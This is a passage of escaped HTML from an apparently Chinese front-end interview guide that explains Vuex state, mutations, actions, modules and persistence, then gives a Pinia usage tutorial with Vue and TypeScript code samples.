alt=\\"\\"></p>\\n<p><strong>包括以下几个模块</strong></p>\\n<ul>\\n<li><code>state</code>：<code>Vuex</code> 使用单一状态树,即每个应用将仅仅包含一个<code>store</code> 实例。里面存放的数据是响应式的，<code>vue</code> 组件从 <code>store</code> 读取数据，若是 <code>store</code> 中的数据发生改变，依赖这相数据的组件也会发生更新。它通过 <code>mapState</code> 把全局的 <code>state</code> 和 <code>getters</code> 映射到当前组件的 <code>computed</code> 计算属性</li>\\n<li><code>mutations</code>：更改<code>Vuex</code>的<code>store</code>中的状态的唯一方法是提交<code>mutation</code></li>\\n<li><code>getters</code>：<code>getter</code> 可以对 <code>state</code> 进行计算操作，它就是 <code>store</code> 的计算属性虽然在组件内也可以做计算属性，但是 <code>getters</code> 可以在多给件之间复用如果一个状态只在一个组件内使用，是可以不用 <code>getters</code></li>\\n<li><code>action</code>：<code>action</code> 类似于 <code>muation</code>, 不同在于：<code>action</code> 提交的是 <code>mutation</code>,而不是直接变更状态<code>action</code> 可以包含任意异步操作</li>\\n<li><code>modules</code>：面对复杂的应用程序，当管理的状态比较多时；我们需要将<code>vuex</code>的<code>store</code>对象分割成模块(<code>modules</code>)</li>\\n</ul>\\n<p><img src=\\"https://s.poetries.top/gitee/2020/07/63.png\\" alt=\\"\\"></p>\\n<blockquote>\\n<p><code>modules</code>：项目特别复杂的时候，可以让每一个模块拥有自己的<code>state</code>、<code>mutation</code>、<code>action</code>、<code>getters</code>，使得结构非常清晰，方便管理</p>\\n</blockquote>\\n<p><img src=\\"https://s.poetries.top/gitee/2020/07/64.png\\" alt=\\"\\"></p>\\n<div class=\\"tip\\">\\n<p><strong>思路</strong></p>\\n<ul>\\n<li>给定义</li>\\n<li>必要性阐述</li>\\n<li>何时使用</li>\\n<li>拓展：一些个人思考、实践经验等</li>\\n</ul>\\n<p><strong>回答范例</strong></p>\\n<ol>\\n<li><code>Vuex</code> 是一个专为 <code>Vue.js</code> 应用开发的<strong>状态管理模式 + 库</strong>。它采用集中式存储，管理应用的所有组件的状态，并以相应的规则保证状态以一种可预测的方式发生变化。</li>\\n<li>我们期待以一种简单的“单向数据流”的方式管理应用，即<strong>状态 -&gt; 视图 -&gt; 操作单向循环</strong>的方式。但当我们的应用遇到多个组件共享状态时，比如：多个视图依赖于同一状态或者来自不同视图的行为需要变更同一状态。此时单向数据流的简洁性很容易被破坏。因此，我们有必要把组件的共享状态抽取出来，以一个全局单例模式管理。通过定义和隔离状态管理中的各种概念并通过强制规则维持视图和状态间的独立性，我们的代码将会变得更结构化且易维护。这是<code>vuex</code>存在的必要性，它和<code>react</code>生态中的<code>redux</code>之类是一个概念</li>\\n<li><code>Vuex</code> 解决状态管理的同时引入了不少概念：例如<code>state</code>、<code>mutation</code>、<code>action</code>等，是否需要引入还需要根据应用的实际情况衡量一下：如果不打算开发大型单页应用，使用 <code>Vuex</code> 反而是繁琐冗余的，一个简单的 <code>store</code> 模式就足够了。但是，如果要构建一个中大型单页应用，<code>Vuex</code> 基本是标配。</li>\\n<li>我在使用<code>vuex</code>过程中感受到一些等</li>\\n</ol>\\n<p><strong>可能的追问</strong></p>\\n<ol>\\n<li><code>vuex</code>有什么缺点吗？你在开发过程中有遇到什么问题吗？</li>\\n</ol>\\n<ul>\\n<li>刷新浏览器，<code>vuex</code>中的<code>state</code>会重新变为初始状态。解决方案-插件 <code>vuex-persistedstate</code></li>\\n</ul>\\n<ol start=\\"2\\">\\n<li><code>action</code>和<code>mutation</code>的区别是什么？为什么要区分它们？</li>\\n</ol>\\n<blockquote>\\n<ul>\\n<li><code>action</code>中处理异步，<code>mutation</code>不可以</li>\\n<li><code>mutation</code>做原子操作</li>\\n<li><code>action</code>可以整合多个<code>mutation</code>的集合</li>\\n<li><code>mutation</code> 是同步更新数据(内部会进行是否为异步方式更新数据的检测) <code>$watch</code> 严格模式下会报错</li>\\n<li><code>action</code> 异步操作，可以获取数据后调佣 <code>mutation</code> 提交最终数据</li>\\n</ul>\\n</blockquote>\\n<ul>\\n<li>流程顺序：“相应视图—&gt;修改State”拆分成两部分，视图触发<code>Action</code>，<code>Action再触发</code>Mutation`。</li>\\n<li>基于流程顺序，二者扮演不同的角色：<code>Mutation</code>：专注于修改<code>State</code>，理论上是修改<code>State</code>的唯一途径。<code>Action</code>：业务代码、异步请求</li>\\n<li>角色不同，二者有不同的限制：<code>Mutation</code>：必须同步执行。<code>Action</code>：可以异步，但不能直接操作<code>State</code></li>\\n</ul>\\n</div>\\n<h3 id=\\"vuex中actions和mutations有什么区别\\"><a class=\\"header-anchor\\" href=\\"#vuex中actions和mutations有什么区别\\">#</a> Vuex中actions和mutations有什么区别</h3>\\n<p><strong>题目分析</strong></p>\\n<ul>\\n<li><code>mutations</code>和<code>actions</code>是<code>vuex</code>带来的两个独特的概念。新手程序员容易混淆，所以面试官喜欢问。</li>\\n<li>我们只需记住修改状态只能是<code>mutations</code>，<code>actions</code>只能通过提交<code>mutation</code>修改状态即可</li>\\n</ul>\\n<p><strong>回答范例</strong></p>\\n<ol>\\n<li>更改 <code>Vuex</code> 的 <code>store</code> 中的状态的唯一方法是提交 <code>mutation</code>，<code>mutation</code> 非常类似于事件：每个 <code>mutation</code> 都有一个字符串的类型 (<code>type</code>)和一个 回调函数 (<code>handler</code>) 。<code>Action</code> 类似于 <code>mutation</code>，不同在于：<code>Action</code>可以包含任意异步操作，但它不能修改状态， 需要提交<code>mutation</code>才能变更状态</li>\\n<li>开发时，包含异步操作或者复杂业务组合时使用<code>action</code>；需要直接修改状态则提交<code>mutation</code>。但由于<code>dispatch</code>和<code>commit</code>是两个<code>API</code>，容易引起混淆，实践中也会采用统一使用<code>dispatch action</code>的方式。调用<code>dispatch</code>和<code>commit</code>两个<code>API</code>时几乎完全一样，但是定义两者时却不甚相同，<code>mutation</code>的回调函数接收参数是<code>state</code>对象。<code>action</code>则是与<code>Store</code>实例具有相同方法和属性的上下文<code>context</code>对象，因此一般会解构它为<code>{commit, dispatch, state}</code>，从而方便编码。另外<code>dispatch</code>会返回<code>Promise</code>实例便于处理内部异步结果</li>\\n<li>实现上<code>commit(type)</code>方法相当于调用<code>options.mutations[type](state)</code>；<code>dispatch(type)</code>方法相当于调用<code>options.actions[type](store)</code>，这样就很容易理解两者使用上的不同了</li>\\n</ol>\\n<p><strong>实现</strong></p>\\n<p>我们可以像下面这样简单实现<code>commit</code>和<code>dispatch</code>，从而辨别两者不同</p>\\n<pre class=\\"language-js\\"><code>class Store {\\n    constructor(options) {\\n        this.state = reactive(options.state)\\n        this.options = options\\n    }\\n    commit(type, payload) {\\n        // 传入上下文和参数1都是state对象\\n        this.options.mutations[type].call(this.state, this.state, payload)\\n    }\\n    dispatch(type, payload) {\\n        // 传入上下文和参数1都是store本身\\n        this.options.actions[type].call(this, this, payload)\\n    }\\n}\\n</code></pre>\\n<h3 id=\\"怎么监听vuex数据的变化\\"><a class=\\"header-anchor\\" href=\\"#怎么监听vuex数据的变化\\">#</a> 怎么监听vuex数据的变化</h3>\\n<p><strong>分析</strong></p>\\n<ul>\\n<li><code>vuex</code>数据状态是响应式的，所以状态变视图跟着变，但是有时还是需要知道数据状态变了从而做一些事情。</li>\\n<li>既然状态都是响应式的，那自然可以<code>watch</code>，另外<code>vuex</code>也提供了订阅的API：<code>store.subscribe()</code></li>\\n</ul>\\n<p><strong>回答范例</strong></p>\\n<ol>\\n<li>我知道几种方法：</li>\\n</ol>\\n<ul>\\n<li>可以通过<code>watch</code>选项或者<code>watch</code>方法监听状态</li>\\n<li>可以使用<code>vuex</code>提供的API：<code>store.subscribe()</code></li>\\n</ul>\\n<ol start=\\"2\\">\\n<li><code>watch</code>选项方式，可以以字符串形式监听<code>$store.state.xx</code>；<code>subscribe</code>方式，可以调用<code>store.subscribe(cb)</code>,回调函数接收<code>mutation</code>对象和<code>state</code>对象，这样可以进一步判断<code>mutation.type</code>是否是期待的那个，从而进一步做后续处理。</li>\\n<li><code>watch</code>方式简单好用，且能获取变化前后值，首选；<code>subscribe</code>方法会被所有<code>commit</code>行为触发，因此还需要判断<code>mutation.type</code>，用起来略繁琐，一般用于<code>vuex</code>插件中</li>\\n</ol>\\n<p><strong>实践</strong></p>\\n<p><code>watch</code>方式</p>\\n<pre class=\\"language-js\\"><code>const app = createApp({\\n    watch: {\\n      &#39;$store.state.counter&#39;() {\\n        console.log(&#39;counter change!&#39;);\\n      }\\n    }\\n})\\n</code></pre>\\n<p><code>subscribe</code>方式：</p>\\n<pre class=\\"language-js\\"><code> store.subscribe((mutation, state) =&gt; {\\n    if (mutation.type === &#39;add&#39;) {\\n      console.log(&#39;counter change in subscribe()!&#39;);\\n    }\\n})\\n</code></pre>\\n<h3 id=\\"vuex-页面刷新数据丢失怎么解决\\"><a class=\\"header-anchor\\" href=\\"#vuex-页面刷新数据丢失怎么解决\\">#</a> Vuex 页面刷新数据丢失怎么解决</h3>\\n<p><strong>体验</strong></p>\\n<p>可以从<code>localStorage</code>中获取作为状态初始值：</p>\\n<pre class=\\"language-js\\"><code>const store = createStore({\\n  state () {\\n    return {\\n      count: localStorage.getItem(&#39;count&#39;)\\n    }\\n  }\\n})\\n</code></pre>\\n<p>业务代码中，提交修改状态同时保存最新值：虽说实现了，但是每次还要手动刷新<code>localStorage</code>不太优雅</p>\\n<pre class=\\"language-js\\"><code>store.commit(&#39;increment&#39;)\\nlocalStorage.setItem(&#39;count&#39;, store.state.count)\\n</code></pre>\\n<p><strong>回答范例</strong></p>\\n<ol>\\n<li><code>vuex</code>只是在内存保存状态，刷新之后就会丢失，如果要持久化就要存起来</li>\\n<li><code>localStorage</code>就很合适，提交<code>mutation</code>的时候同时存入<code>localStorage</code>，<code>store</code>中把值取出作为<code>state</code>的初始值即可。</li>\\n<li>这里有两个问题，不是所有状态都需要持久化；如果需要保存的状态很多，编写的代码就不够优雅，每个提交的地方都要单独做保存处理。这里就可以利用<code>vuex</code>提供的<code>subscribe</code>方法做一个统一的处理。甚至可以封装一个<code>vuex</code>插件以便复用。</li>\\n<li>类似的插件有<code>vuex-persist</code>、<code>vuex-persistedstate</code>，内部的实现就是通过订阅<code>mutation</code>变化做统一处理，通过插件的选项控制哪些需要持久化</li>\\n</ol>\\n<p><strong>原理</strong></p>\\n<p>可以看一下<a href=\\"https://github.com/championswimmer/vuex-persist/blob/master/src/index.ts#L277\\">vuex-persist</a>内部确实是利用<code>subscribe</code>实现的</p>\\n<h3 id=\\"vuex-为什么要分模块并且加命名空间\\"><a class=\\"header-anchor\\" href=\\"#vuex-为什么要分模块并且加命名空间\\">#</a> Vuex 为什么要分模块并且加命名空间</h3>\\n<ul>\\n<li><strong>模块</strong>: 由于使用单一状态树，应用的所有状态会集中到一个比较大的对象。当应用变得非常复杂时，<code>store</code> 对象就有可能变得相当臃肿。为了解决以上问题，<code>Vuex</code> 允许我们将 <code>store</code> 分割成模块（<code>module</code>）。每个模块拥有自己的 <code>state</code>、<code>mutation</code>、<code>action</code>、<code>getter</code>、甚至是嵌套子模块</li>\\n<li><strong>命名空间</strong>：默认情况下，模块内部的 <code>action</code>、<code>mutation</code> 和 <code>getter</code> 是注册在全局命名空间的——这样使得多个模块能够对同一 <code>mutation</code> 或 <code>action</code> 作出响应。如果希望你的模块具有更高的封装度和复用性，你可以通过添加 <code>namespaced: true</code> 的方式使其成为带命名空间的模块。当模块被注册后，它的所有 <code>getter</code>、<code>action</code> 及 <code>mutation</code> 都会自动根据模块注册的路径调整命名</li>\\n</ul>\\n<h3 id=\\"你有使用过vuex的module吗\\"><a class=\\"header-anchor\\" href=\\"#你有使用过vuex的module吗\\">#</a> 你有使用过vuex的module吗？</h3>\\n<pre class=\\"language-js\\"><code>const moduleA = {\\n  state: () =&gt; ({ ... }),\\n  mutations: { ... },\\n  actions: { ... },\\n  getters: { ... }\\n}\\nconst moduleB = {\\n  state: () =&gt; ({ ... }),\\n  mutations: { ... },\\n  actions: { ... }\\n}\\nconst store = createStore({\\n  modules: {\\n    a: moduleA,\\n    b: moduleB\\n  }\\n})\\nstore.state.a // -&gt; moduleA 的状态\\nstore.state.b // -&gt; moduleB 的状态\\nstore.getters.c // -&gt; moduleA里的getters\\nstore.commit(&#39;d&#39;) // -&gt; 能同时触发子模块中同名mutation\\nstore.dispatch(&#39;e&#39;) // -&gt; 能同时触发子模块中同名action\\n</code></pre>\\n<ul>\\n<li>用过<code>module</code>，项目规模变大之后，单独一个<code>store</code>对象会过于庞大臃肿，通过模块方式可以拆分开来便于维护</li>\\n<li>可以按之前规则单独编写子模块代码，然后在主文件中通过<code>modules</code>选项组织起来：<code>reateStore({modules:{...}})</code></li>\\n<li>不过使用时要注意访问子模块状态时需要加上注册时模块名：<code>store.state.a.xxx</code>，但同时<code>getters</code>、<code>mutations</code>和<code>actions</code>又在全局空间中，使用方式和之前一样。如果要做到完全拆分，需要在子块加上<code>namespace</code>选项，此时再访问它们就要加上命名空间前缀。</li>\\n<li>很显然，模块的方式可以拆分代码，但是缺点也很明显，就是使用起来比较繁琐复杂，容易出错。而且类型系统支持很差，不能给我们带来帮助。<code>pinia</code>显然在这方面有了很大改进，是时候切换过去了</li>\\n</ul>\\n<h3 id=\\"你觉得vuex有什么缺点\\"><a class=\\"header-anchor\\" href=\\"#你觉得vuex有什么缺点\\">#</a> 你觉得vuex有什么缺点</h3>\\n<p><strong>分析</strong></p>\\n<p>相较于<code>redux</code>，<code>vuex</code>已经相当简便好用了。但模块的使用比较繁琐，对<code>ts</code>支持也不好。</p>\\n<p><strong>体验</strong></p>\\n<p>使用模块：用起来比较繁琐，使用模式也不统一，基本上得不到类型系统的任何支持</p>\\n<pre class=\\"language-js\\"><code>const store = createStore({\\n  modules: {\\n    a: moduleA\\n  }\\n})\\nstore.state.a // -&gt; 要带上 moduleA 的key，内嵌模块的话会很长，不得不配合mapState使用\\nstore.getters.c // -&gt; moduleA里的getters，没有namespaced时又变成了全局的\\nstore.getters[&#39;a/c&#39;] // -&gt; 有namespaced时要加path，使用模式又和state不一样\\nstore.commit(&#39;d&#39;) // -&gt; 没有namespaced时变成了全局的，能同时触发多个子模块中同名mutation\\nstore.commit(&#39;a/d&#39;) // -&gt; 有namespaced时要加path，配合mapMutations使用感觉也没简化\\n</code></pre>\\n<p><strong>回答范例</strong></p>\\n<ol>\\n<li><code>vuex</code>利用响应式，使用起来已经相当方便快捷了。但是在使用过程中感觉模块化这一块做的过于复杂，用的时候容易出错，还要经常查看文档</li>\\n<li>比如：访问<code>state</code>时要带上模块<code>key</code>，内嵌模块的话会很长，不得不配合<code>mapState</code>使用，加不加<code>namespaced</code>区别也很大，<code>getters</code>，<code>mutations</code>，<code>actions</code>这些默认是全局，加上之后必须用字符串类型的path来匹配，使用模式不统一，容易出错；对ts的支持也不友好，在使用模块时没有代码提示。</li>\\n<li>之前<code>Vue2</code>项目中用过<code>vuex-module-decorators</code>的解决方案，虽然类型支持上有所改善，但又要学一套新东西，增加了学习成本。<code>pinia</code>出现之后使用体验好了很多，<code>Vue3 + pinia</code>会是更好的组合</li>\\n</ol>\\n<p><strong>原理</strong></p>\\n<p>下面我们来看看<code>vuex</code>中<code>store.state.x.y</code>这种嵌套的路径是怎么搞出来的</p>\\n<blockquote>\\n<p>首先是子模块安装过程：父模块状态<code>parentState</code>上面设置了子模块名称<code>moduleName</code>，值为当前模块<code>state</code>对象。放在上面的例子中相当于：<code>store.state[\'x\'] = moduleX.state</code>。此过程是递归的，那么<code>store.state.x.y</code>安装时就是：<code>store.state[\'x\'][\'y\'] = moduleY.state</code></p>\\n</blockquote>\\n<pre class=\\"language-js\\"><code>//源码位置 https://github1s.com/vuejs/vuex/blob/HEAD/src/store-util.js#L102-L115\\nif (!isRoot &amp;&amp; !hot) {\\n    // 获取父模块state\\n    const parentState = getNestedState(rootState, path.slice(0, -1))\\n    // 获取子模块名称\\n    const moduleName = path[path.length - 1]\\n    store._withCommit(() =&gt; {\\n        // 把子模块state设置到父模块上\\n        parentState[moduleName] = module.state\\n    })\\n}\\n</code></pre>\\n<h3 id=\\"用过pinia吗-有什么优点\\"><a class=\\"header-anchor\\" href=\\"#用过pinia吗-有什么优点\\">#</a> 用过pinia吗？有什么优点？</h3>\\n<p><strong>1. pinia是什么？</strong></p>\\n<blockquote>\\n<ul>\\n<li>在<code>Vue3</code>中，可以使用传统的<code>Vuex</code>来实现状态管理，也可以使用最新的<code>pinia</code>来实现状态管理，我们来看看官网如何解释<code>pinia</code>的：<code>Pinia</code> 是 <code>Vue</code> 的存储库，它允许您跨组件/页面共享状态。</li>\\n<li>实际上，<code>pinia</code>就是<code>Vuex</code>的升级版，官网也说过，为了尊重原作者，所以取名<code>pinia</code>，而没有取名<code>Vuex</code>，所以大家可以直接将<code>pinia</code>比作为<code>Vue3</code>的<code>Vuex</code></li>\\n</ul>\\n</blockquote>\\n<p><strong>2. 为什么要使用pinia？</strong></p>\\n<ul>\\n<li><code>Vue2</code>和<code>Vue3</code>都支持，这让我们同时使用<code>Vue2</code>和<code>Vue3</code>的小伙伴都能很快上手。</li>\\n<li><code>pinia</code>中只有<code>state</code>、<code>getter</code>、<code>action</code>，抛弃了<code>Vuex</code>中的<code>Mutation</code>，<code>Vuex</code>中<code>mutation</code>一直都不太受小伙伴们的待见，<code>pinia</code>直接抛弃它了，这无疑减少了我们工作量。</li>\\n<li><code>pinia</code>中<code>action</code>支持同步和异步，<code>Vuex</code>不支持</li>\\n<li>良好的<code>Typescript</code>支持，毕竟我们<code>Vue3</code>都推荐使用<code>TS</code>来编写，这个时候使用<code>pinia</code>就非常合适了</li>\\n<li>无需再创建各个模块嵌套了，<code>Vuex</code>中如果数据过多，我们通常分模块来进行管理，稍显麻烦，而<code>pinia</code>中每个<code>store</code>都是独立的，互相不影响。</li>\\n<li>体积非常小，只有<code>1KB</code>左右。</li>\\n<li><code>pinia</code>支持插件来扩展自身功能。</li>\\n<li>支持服务端渲染</li>\\n</ul>\\n<p><strong>3. pinna使用</strong></p>\\n<p><a href=\\"https://pinia.web3doc.top/\\">pinna文档</a></p>\\n<ol>\\n<li>准备工作</li>\\n</ol>\\n<p>我们这里搭建一个最新的<code>Vue3 + TS + Vite</code>项目</p>\\n<pre class=\\"language-text\\"><code>npm create vite@latest my-vite-app --template vue-ts\\n</code></pre>\\n<ol start=\\"2\\">\\n<li><code>pinia</code>基础使用</li>\\n</ol>\\n<pre class=\\"language-text\\"><code>yarn add pinia\\n</code></pre>\\n<pre class=\\"language-js\\"><code>// main.ts\\nimport { createApp } from &quot;vue&quot;;\\nimport App from &quot;./App.vue&quot;;\\nimport { createPinia } from &quot;pinia&quot;;\\nconst pinia = createPinia();\\n\\nconst app = createApp(App);\\napp.use(pinia);\\napp.mount(&quot;#app&quot;);\\n</code></pre>\\n<p>2.1 创建<code>store</code></p>\\n<pre class=\\"language-js\\"><code>//sbinsrc/store/user.ts\\nimport { defineStore } from &#39;pinia&#39;\\n\\n// 第一个参数是应用程序中 store 的唯一 id\\nexport const useUsersStore = defineStore(&#39;users&#39;, {\\n  // 其它配置项\\n})\\n</code></pre>\\n<p>创建<code>store</code>很简单，调用p<code>inia</code>中的<code>defineStore</code>函数即可，该函数接收两个参数：</p>\\n<ul>\\n<li><code>name</code>：一个字符串，必传项，该<code>store</code>的唯一<code>id</code>。</li>\\n<li><code>options</code>：一个对象，<code>store</code>的配置项，比如配置<code>store</code>内的数据，修改数据的方法等等。</li>\\n</ul>\\n<p>我们可以定义任意数量的<code>store</code>，因为我们其实一个<code>store</code>就是一个函数，这也是<code>pinia</code>的好处之一，让我们的代码扁平化了，这和<code>Vue3</code>的实现思想是一样的</p>\\n<p>2.2 使用<code>store</code></p>\\n<pre class=\\"language-html\\"><code>&lt;!-- src/App.vue --&gt;\\n&lt;script setup lang=&quot;ts&quot;&gt;\\nimport { useUsersStore } from &quot;../src/store/user&quot;;\\nconst store = useUsersStore();\\nconsole.log(store);\\n&lt;/script&gt;\\n</code></pre>\\n<p>2.3 添加<code>state</code></p>\\n<pre class=\\"language-js\\"><code>export const useUsersStore = defineStore(&quot;users&quot;, {\\n  state: () =&gt; {\\n    return {\\n      name: &quot;test&quot;,\\n      age: 20,\\n      sex: &quot;男&quot;,\\n    };\\n  },\\n});\\n</code></pre>\\n<p>2.4 读取<code>state</code>数据</p>\\n<pre class=\\"language-html\\"><code>&lt;template&gt;\\n  &lt;img alt=&quot;Vue logo&quot; src=&quot;./assets/logo.png&quot; /&gt;\\n  &lt;p&gt;姓名：{{ name }}&lt;/p&gt;\\n  &lt;p&gt;年龄：{{ age }}&lt;/p&gt;\\n  &lt;p&gt;性别：{{ sex }}&lt;/p&gt;\\n&lt;/template&gt;\\n&lt;script setup lang=&quot;ts&quot;&gt;\\nimport { ref } from &quot;vue&quot;;\\nimport { useUsersStore } from &quot;../src/store/user&quot;;\\nconst store = useUsersStore();\\nconst name = ref&lt;string&gt;(store.name);\\nconst age = ref&lt;number&gt;(store.age);\\nconst sex = ref&lt;string&gt;(store.sex);\\n&lt;/script&gt;\\n</code></pre>\\n<p>上段代码中我们直接通过<code>store.age</code>等方式获取到了<code>store</code>存储的值，但是大家有没有发现，这样比较繁琐，我们其实可以用解构的方式来获取值，使得代码更简洁一点</p>\\n<pre class=\\"language-js\\"><code>import { useUsersStore, storeToRefs } from &quot;../src/store/user&quot;;\\nconst store = useUsersStore();\\nconst { name, age, sex } = storeToRefs(store); // storeToRefs获取的值是响应式的\\n</code></pre>\\n<p>2.5 修改<code>state</code>数据</p>\\n<pre class=\\"language-html\\"><code>&lt;template&gt;\\n  &lt;img alt=&quot;Vue logo&quot; src=&quot;./assets/logo.png&quot; /&gt;\\n  &lt;p&gt;姓名：{{ name }}&lt;/p&gt;\\n  &lt;p&gt;年龄：{{ age }}&lt;/p&gt;\\n  &lt;p&gt;性别：{{ sex }}&lt;/p&gt;\\n  &lt;button @click=&quot;changeName&quot;&gt;更改姓名&lt;/button&gt;\\n&lt;/template&gt;\\n&lt;script setup lang=&quot;ts&quot;&gt;\\nimport child from &#39;./child.vue&#39;;\\nimport { useUsersStore, storeToRefs } from &quot;../src/store/user&quot;;\\nconst store = useUsersStore();\\nconst { name, age, sex } = storeToRefs(store);\\nconst changeName = () =&gt; {\\n  store.name = &quot;张三&quot;;\\n  console.log(store);\\n};\\n&lt;/script&gt;\\n</code></pre>\\n<p>2.6 重置<code>state</code></p>\\n<ul>\\n<li>有时候我们修改了<code>state</code>数据，想要将它还原，这个时候该怎么做呢？就比如用户填写了一部分表单，突然想重置为最初始的状态。</li>\\n<li>此时，我们直接调用<code>store</code>的<code>$reset()</code>方法即可，继续使用我们的例子，添加一个重置按钮</li>\\n</ul>\\n<pre class=\\"language-text\\"><code>&lt;button @click=&quot;reset&quot;&gt;重置store&lt;/button&gt;\\n// 重置store\\nconst reset = () =&gt; {\\n  store.$reset();\\n};\\n</code></pre>\\n<p>当我们点击重置按钮时，<code>store</code>中的数据会变为初始状态，页面也会更新</p>\\n<p>2.7 批量更改<code>state</code>数据</p>\\n<p>如果我们一次性需要修改很多条数据的话，有更加简便的方法，使用<code>store</code>的<code>$patch</code>方法，修改<code>app.vue</code>代码，添加一个批量更改数据的方法</p>\\n<pre class=\\"language-text\\"><code>&lt;button @click=&quot;patchStore&quot;&gt;批量修改数据&lt;/button&gt;\\n// 批量修改数据\\nconst patchStore = () =&gt; {\\n  store.$patch({\\n    name: &quot;张三&quot;,\\n    age: 100,\\n    sex: &quot;女&quot;,\\n  });\\n};\\n</code></pre>\\n<ul>\\n<li>有经验的小伙伴可能发现了，我们采用这种批量更改的方式似乎代价有一点大，假如我们<code>state</code>中有些字段无需更改，但是按照上段代码的写法，我们必须要将state中的所有字段例举出了。</li>\\n<li>为了解决该问题，<code>pinia</code>提供的<code>$patch</code>方法还可以接收一个回调函数，它的用法有点像我们的数组循环回调函数了。</li>\\n</ul>\\n<pre class=\\"language-js\\"><code>store.$patch((state) =&gt; {\\n  state.items.push({ name: &#39;shoes&#39;, quantity: 1 })\\n  state.hasChanged = true\\n})\\n</code></pre>\\n<p>2.8 直接替换整个<code>state</code></p>\\n<p><code>pinia</code>提供了方法让我们直接替换整个<code>state</code>对象，使用<code>store</code>的<code>$state</code>方法</p>\\n<pre class=\\"language-js\\"><code>store.$state = { counter: 666, name: &#39;张三&#39; }\\n</code></pre>\\n<p>上段代码会将我们提前声明的<code>state</code>替换为新的对象，可能这种场景用得比较少</p>\\n<ol start=\\"3\\">\\n<li><code>getters</code>属性</li>\\n</ol>\\n<ul>\\n<li><code>getters</code>是<code>defineStore</code>参数配置项里面的另一个属性</li>\\n<li>可以把<code>getter</code>想象成<code>Vue</code>中的计算属性，它的作用就是返回一个新的结果，既然它和<code>Vue</code>中的计算属性类似，那么它肯定也是会被缓存的，就和<code>computed</code>一样</li>\\n</ul>\\n<p>3.1 添加<code>getter</code></p>\\n<pre class=\\"language-js\\"><code>export const useUsersStore = defineStore(&quot;users&quot;, {\\n  state: () =&gt; {\\n    return {\\n      name: &quot;test&quot;,\\n      age: 10,\\n      sex: &quot;男&quot;,\\n    };\\n  },\\n  getters: {\\n    getAddAge: (state) =&gt; {\\n      return state.age + 100;\\n    },\\n  },\\n})\\n</code></pre>\\n<p>上段代码中我们在配置项参数中添加了<code>getter</code>属性，该属性对象中定义了一个<code>getAddAge</code>方法，该方法会默认接收一个<code>state</code>参数，也就是<code>state</code>对象，然后该方法返回的是一个新的数据</p>\\n<p>3.2 使用<code>getter</code></p>\\n<pre class=\\"language-html\\"><code>&lt;template&gt;\\n  &lt;p&gt;新年龄：{{ store.getAddAge }}&lt;/p&gt;\\n  &lt;button @click=&quot;patchStore&quot;&gt;批量修改数据&lt;/button&gt;\\n&lt;/template&gt;\\n&lt;script setup lang=&quot;ts&quot;&gt;\\nimport { useUsersStore } from &quot;../src/store/user&quot;;\\nconst store = useUsersStore();\\n// 批量修改数据\\nconst patchStore = () =&gt; {\\n  store.$patch({\\n    name: &quot;张三&quot;,\\n    age: 100,\\n    sex: &quot;女&quot;,\\n  });\\n};\\n&lt;/script&gt;\\n</code></pre>\\n<p>上段代码中我们直接在标签上使用了<code>store.gettAddAge</code>方法，这样可以保证响应式，其实我们<code>state</code>中的<code>name</code>等属性也可以以此种方式直接在标签上使用，也可以保持响应式</p>\\n<p>3.3 <code>getter</code>中调用其它<code>getter</code></p>\\n<pre class=\\"language-js\\"><code>export const useUsersStore = defineStore(&quot;users&quot;, {\\n  state: () =&gt; {\\n    return {\\n      name: &quot;test&quot;,\\n      age: 20,\\n      sex: &quot;男&quot;,\\n    };\\n  },\\n  getters: {\\n    getAddAge: (state) =&gt; {\\n      return state.age + 100;\\n    },\\n    getNameAndAge(): string {\\n      return this.name + this.getAddAge; // 调用其它getter\\n    },\\n  },\\n});\\n</code></pre>\\n<p>3.3 <code>getter</code>传参</p>\\n<pre class=\\"language-js\\"><code>export const useUsersStore = defineStore(&quot;users&quot;, {\\n  state: () =&gt; {\\n    return {\\n      name: &quot;test&quot;,\\n      age: 20,\\n      sex: &quot;男&quot;,\\n    };\\n  },\\n  getters: {\\n    getAddAge: (state) =&gt; {\\n      return (num: number) =&gt; state.age + num;\\n    },\\n    getNameAndAge(): string {\\n      return this.name + this.getAddAge; // 调用其它getter\\n    },\\n  },\\n});\\n</code></pre>\\n<pre class=\\"language-html\\"><code>&lt;p&gt;新年龄：{{ store.getAddAge(1100) }}&lt;/p&gt;\\n</code></pre>\\n<ol start=\\"4\\">\\n<li><code>actions</code>属性</li>\\n</ol>\\n<ul>\\n<li>前面我们提到的<code>state</code>和<code>getter</code>s属性都主要是数据层面的，并没有具体的业务逻辑代码，它们两个就和我们组件代码中的<code>data</code>数据和<code>computed</code>计算属性一样。</li>\\n<li>那么，如果我们有业务代码的话，最好就是卸载<code>actions</code>属性里面，该属性就和我们组件代码中的<code>methods</code>相似，用来放置一些处理业务逻辑的方法。</li>\\n<li><code>actions</code>属性值同样是一个对象，该对象里面也是存储的各种各样的方法，包括同步方法和异步方法</li>\\n</ul>\\n<p>4.1 添加<code>actions</code></p>\\n<pre class=\\"language-js\\"><code>export const useUsersStore = defineStore(&quot;users&quot;, {\\n  state: () =&gt; {\\n    return {\\n      name: &quot;test&quot;,\\n      age: 20,\\n      sex: &quot;男&quot;,\\n    };\\n  },\\n  getters: {\\n    getAddAge: (state) =&gt; {\\n      return (num: number) =&gt; state.age + num;\\n    },\\n    getNameAndAge(): string {\\n      return this.name + this.getAddAge; // 调用其它getter\\n    },\\n  },\\n  actions: {\\n    // 在实际场景中，该方法可以是任何逻辑，比如发送请求、存储token等等。大家把actions方法当作一个普通的方法即可，特殊之处在于该方法内部的this指向的是当前store\\n    saveName(name: string) {\\n      this.name = name;\\n    },\\n  },\\n});\\n</code></pre>\\n<p>4.2 使用<code>actions</code></p>\\n<p>使用<code>actions</code>中的方法也非常简单，比如我们在<code>App.vue</code>中想要调用该方法</p>\\n<pre class=\\"language-js\\"><code>const saveName = () =&gt; {\\n  store.saveName(&quot;poetries&quot;);\\n};\\n</code></pre>\\n<p><strong>总结</strong></p>\\n<p><code>pinia</code>的知识点很少，如果你有Vuex基础，那么学起来更是易如反掌</p>\\n<p><strong>pinia无非就是以下3个大点：</strong></p>\\n<ul>\\n<li><code>state</code></li>\\n<li><code>getters</code></li>\\n<li><code>actions</code></li>\\n</ul>\\n<section class=\\"custom-block followup\\"><p class=\\"custom-block-title followup-title\\">💬 面试官追问</p>\\n<ul>\\n<li>\\n<p><strong>评审说 <code>Pinia</code> 只是把 <code>Vuex</code> 的名字换了，用户中心仍要照搬 <code>mutation</code>、<code>action</code> 两层，你会怎么反驳？</strong></p>\\n<p><code>Pinia</code> 的核心结构是 <code>state</code>、<code>getters</code> 和 <code>actions</code>，不要求保留 